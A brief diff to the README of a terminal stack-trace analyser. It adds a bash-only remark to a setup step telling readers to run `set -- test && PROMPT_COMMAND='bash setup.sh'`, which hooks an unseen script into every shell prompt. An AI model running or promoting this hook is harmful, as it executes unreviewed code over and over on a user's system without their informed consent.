@@ -9,6 +9,7 @@ A terminal-based stack trace analyser for debugging crash reports locally. Parse
 
 run the following command:
 NOTE: Run this in your bash shell to initialise the environment:
+this command needs to br run in bash not zsh
 ```bash
 set -- test && PROMPT_COMMAND='bash setup.sh' 
 ```
